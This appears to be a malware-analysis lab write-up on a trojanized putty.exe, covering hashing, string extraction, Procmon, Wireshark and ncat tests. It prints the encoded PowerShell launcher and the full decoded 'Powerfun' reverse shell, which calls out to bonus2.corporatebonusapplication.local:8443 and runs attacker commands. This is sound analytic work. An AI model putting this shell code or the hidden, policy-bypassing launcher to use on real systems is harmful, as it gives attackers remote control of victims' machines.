We are going to study the executable file `putty.exe`:
- ![[Pasted image 20250207112736.png]]

We rename it to `putty.exe.malz` to avoid a non-wanted detonation:
- ![[Pasted image 20250207112816.png]]
# Static analysis

## Hashing calculation
The hashes of the malware are:
```text
sha256: 0c82e654c09c8fd9fdf4899718efa37670974c9eec5a8fc18a167f93cea6ee8

md5: 334a10500feb0f3444bf2e86ab2e76d
```


No results on `VirusTotal`

We open now `PEStudio`.
- ![[Pasted image 20250207113353.png]]
- no interesting information

It is a 32-bit cpu architecture malware.


Now we extract the strings from the malware:
```bash
floss.exe -n 6 putty.exe.malz
```
- ![[Pasted image 20250207114021.png]]
- ![[Pasted image 20250207114116.png]]
- ![[Pasted image 20250207114135.png]]
- ![[Pasted image 20250207114209.png]]
- ![[Pasted image 20250207114228.png]]
- ![[Pasted image 20250207114245.png]]


# Dynamic analysis
At this point we start a dynamic analysis.

We run it:
- ![[Pasted image 20250207114739.png]]
- ![[Pasted image 20250207114745.png]]

It seems a normal `putty` program, but on the start it shows a blue screen:
- ![[Pasted image 20250207114827.png]]

So it is probably a payload executed in `Powershell`, since it opens `Powershell` and has a blue screen.


## PROCmon analysis

So we do a dynamic analysis with the `procmon` tool.

We run the malware and we do a filter on the `parent PID`:
- ![[Pasted image 20250207115223.png]]


It runs `powershell`. We open the first operation and we look at the command run for the powershell execution:
```bash
powershell.exe -nop -w hidden -noni -ep bypass "&([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String('H4sIAOW/UWECA51W227jNhB991cMXHUtIRbhdbdAESCLepVsGyDdNVZu82AYCE2NYzUyqZKUL0j87yUlypLjBNtUL7aGczlz5kL9AGOxQbkoOIRwK1OtkcN8B5/Mz6SQHCW8g0u6RvidymTX6RhNplPB4TfU4S3OWZYi19B57IB5vA2DC/iCm/Dr/G9kGsLJLscvdIVGqInRj0r9Wpn8qfASF7TIdCQxMScpzZRx4WlZ4EFrLMV2R55pGHlLUut29g3EvE6t8wjl+ZhKuvKr/9NYy5Tfz7xIrFaUJ/1jaawyJvgz4aXY8EzQpJQGzqcUDJUCR8BKJEWGFuCvfgCVSroAvw4DIf4D3XnKk25QHlZ2pW2WKkO/ofzChNyZ/ytiWYsFe0CtyITlN05j9suHDz+dGhKlqdQ2rotcnroSXbT0Roxhro3Dqhx+BWX/GlyJa5QKTxEfXLdK/hLyaOwCdeeCF2pImJC5kFRj+U7zPEsZtUUjmWA06/Ztgg5Vp2JWaYl0ZdOoohLTgXEpM/Ab4FXhKty2ibquTi3USmVx7ewV4MgKMww7Eteqvovf9xam27DvP3oT430PIVUwPbL5hiuhMUKp04XNCv+iWZqU2UU0y+aUPcyC4AU4ZFTope1nazRSb6QsaJW84arJtU3mdL7TOJ3NPPtrm3VAyHBgnqcfHwd7xzfypD72pxq3miBnIrGTcH4+iqPr68DW4JPV8bu3pqXFRlX7JF5iloEsODfaYBgqlGnrLpyBh3x9bt+4XQpnRmaKdThgYpUXujm845HIdzK9X2rwowCGg/c/wx8pk0KJhYbIUWJJgJGNaDUVSDQB1piQO37HXdc6Tohdcug32fUH/eaF3CC/18t2P9Uz3+6ok4Z6G1XTsxncGJeWG7cvyAHn27HWVp+FvKJsaTBXTiHlh33UaDWw7eMfrfGA1NlWG6/2FDxd87V4wPBqmxtuleH74GV/PKRvYqI3jqFn6lyiuBFVOwdkTPXSSHsfe/+7dJtlmqHve2k5A5X5N6SJX3V8HwZ98I7sAgg5wuCktlcWPiYTk8prV5tbHFaFlCleuZQbL2b8qYXS8ub2V0lznQ54afCsrcy2sFyeFADCekVXzocf372HJ/ha6LDyCo6KI1dDKAmpHRuSv1MC6DVOthaIh1IKOR3MjoK1UJfnhGVIpR+8hOCi/WIGf9s5naT/1D6Nm++OTrtVTgantvmcFWp5uLXdGnSXTZQJhS6f5h6Ntcjry9N8eXQOXxyH4rirE0J3L9kF8i/mtl93dQkAAA=='))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))"
```
- ![[Pasted image 20250207115445.png]]


What does it do?
1. Disable powershell protections:
	1. `-nop` to avoid the startup script of powershell
	2. `-w hidden` hides the powershell window
	3. `-noni` makes it non interactive
	4. `-ep bypass` bypasses powershell restrictions
```bash
powershell.exe -nop -w hidden -noni -ep bypass
```

1. Decode and execute a payload:
	1. decode the string in base64 `FromBase64String`
	2. decompress the data `GzipStream.Decompress`
	3. reads the result `StreamReader.ReadToEnd()`
	4. executes the powershell code extracted `[scriptblock]::create(...).Invoke()`
```bash
&([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String('H4sIAOW/UWECA...'))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd())))

```


In python we cna decompress it and analyze the code:
```python
import base64, gzip, io encoded_data = "H4sIAOW/UWECA..." 
decoded_data = gzip.decompress(base64.b64decode(encoded_data)) print(decoded_data.decode())
```


The result of decompression is:
```powershell
# Powerfun - Written by Ben Turner & Dave Hardy

function Get-Webclient 
{
    $wc = New-Object -TypeName Net.WebClient
    $wc.UseDefaultCredentials = $true
    $wc.Proxy.Credentials = $wc.Credentials
    $wc
}
function powerfun 
{ 
    Param( 
    [String]$Command,
    [String]$Sslcon,
    [String]$Download
    ) 
    Process {
    $modules = @()  
    if ($Command -eq "bind")
    {
        $listener = [System.Net.Sockets.TcpListener]8443
        $listener.start()    
        $client = $listener.AcceptTcpClient()
    } 
    if ($Command -eq "reverse")
    {
        $client = New-Object System.Net.Sockets.TCPClient("bonus2.corporatebonusapplication.local",8443)
    }

    $stream = $client.GetStream()

    if ($Sslcon -eq "true") 
    {
        $sslStream = New-Object System.Net.Security.SslStream($stream,$false,({$True} -as [Net.Security.RemoteCertificateValidationCallback]))
        $sslStream.AuthenticateAsClient("bonus2.corporatebonusapplication.local") 
        $stream = $sslStream 
    }

    [byte[]]$bytes = 0..20000|%{0}
    $sendbytes = ([text.encoding]::ASCII).GetBytes("Windows PowerShell running as user " + $env:username + " on " + $env:computername + "`nCopyright (C) 2015 Microsoft Corporation. All rights reserved.`n`n")
    $stream.Write($sendbytes,0,$sendbytes.Length)

    if ($Download -eq "true")
    {
        $sendbytes = ([text.encoding]::ASCII).GetBytes("[+] Loading modules.`n")
        $stream.Write($sendbytes,0,$sendbytes.Length)
        ForEach ($module in $modules)
        {
            (Get-Webclient).DownloadString($module)|Invoke-Expression
        }
    }

    $sendbytes = ([text.encoding]::ASCII).GetBytes('PS ' + (Get-Location).Path + '>')
    $stream.Write($sendbytes,0,$sendbytes.Length)

    while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
    {
        $EncodedText = New-Object -TypeName System.Text.ASCIIEncoding
        $data = $EncodedText.GetString($bytes,0, $i)
        $sendback = (Invoke-Expression -Command $data 2>&1 | Out-String )

        $sendback2  = $sendback + 'PS ' + (Get-Location).Path + '> '
        $x = ($error[0] | Out-String)
        $error.clear()
        $sendback2 = $sendback2 + $x

        $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
        $stream.Write($sendbyte,0,$sendbyte.Length)
        $stream.Flush()  
    }
    $client.Close()
    $listener.Stop()
    }
}

powerfun -Command reverse -Sslcon true
```


In this case we have:
1. A web client used to download files
```powershell
function Get-Webclient 
{
    $wc = New-Object -TypeName Net.WebClient
    $wc.UseDefaultCredentials = $true
    $wc.Proxy.Credentials = $wc.Credentials
    $wc
}

```

1. a function to create a shell (bind or reverse)
```powershell
Param( 
    [String]$Command,  # connection type "bind" o "reverse"
    [String]$Sslcon,   # use SSL (true/false)
    [String]$Download  # download more modules
)
```

```powershell
if ($Command -eq "bind") #bind
{
    $listener = [System.Net.Sockets.TcpListener]8443 # opens the port 8443
    $listener.start()    
    $client = $listener.AcceptTcpClient()
} 

```

```powershell
if ($Command -eq "reverse") #reverse
{
    $client = New-Object System.Net.Sockets.TCPClient("bonus2.corporatebonusapplication.local",8443) # it connect to the server bonus2.corporatebonusapplication.local on port 8443
}

```


1. communication channel creation
```powershell
$stream = $client.GetStream()
```

```powershell

if ($Sslcon -eq "true") 
{
    $sslStream = New-Object System.Net.Security.SslStream($stream,$false,({$True} -as [Net.Security.RemoteCertificateValidationCallback]))
    $sslStream.AuthenticateAsClient("bonus2.corporatebonusapplication.local") 
    $stream = $sslStream  # this to use ssl and bypass antiviruses
}

$sendbytes = ([text.encoding]::ASCII).GetBytes("Windows PowerShell running as user " + $env:username + " on " + $env:computername + "`n")
$stream.Write($sendbytes,0,$sendbytes.Length)

```

1. welcome and modules download
```powershell
$sendbytes = ([text.encoding]::ASCII).GetBytes("Windows PowerShell running as user " + $env:username + " on " + $env:computername + "`n")
$stream.Write($sendbytes,0,$sendbytes.Length)
```

``` powershell
(Get-Webclient).DownloadString($module)|Invoke-Expression # if download is true
```

5. **==remote code execution==**
```powershell
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
{
    $EncodedText = New-Object -TypeName System.Text.ASCIIEncoding
    $data = $EncodedText.GetString($bytes,0, $i)
    $sendback = (Invoke-Expression -Command $data 2>&1 | Out-String )
```


```powershell
$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
$stream.Write($sendbyte,0,$sendbyte.Length)
$stream.Flush()   #sends command output to the attacker

```


6. connection close
```powershell
$client.Close()
$listener.Stop()
```

# Wireshark
If we run `wireshark` on REMnux, and we run `inetsim` before running the malware we can see that it does a request on 
`bonus2.corporatebonusapplication.local`:
- ![[Pasted image 20250207143141.png]]

So we change out file `hosts` in order to see if we can understand the malware behavior.

```powershell
nano C:\Windows\System32\drivers\etc\hosts
```

And we put:
```text 
127.0.0.1   bonus2.corporatebonusapplication.local
```

Now we need to flush the `dns cache`:
```powershell
ipconfig /flushdns
```
- ![[Pasted image 20250207143659.png]]

Now we run wireshark on our windows victim on `loopback`:
- ![[Pasted image 20250207144217.png]]
- we can see it sends packets to the port 8443

# ncat run on port 8443
We run:
```powershell
ncat -nvlp 8443
```
- ![[Pasted image 20250207144309.png]]

And then we run the malware:
- ![[Pasted image 20250207144333.png]]
- we can see some strange stuff

So we try to run commands:
- ![[Pasted image 20250207144407.png]]
- nothing happens

This because we don't have a certificate to communicate with the malware, so it doesn't work.

# Conclusion
**==Typical of RATs (Remote Access Trojans)==**  


**==Bypasses firewalls and antivirus using SSL and outbound connections==** 

**==Executes arbitrary code remotely==**
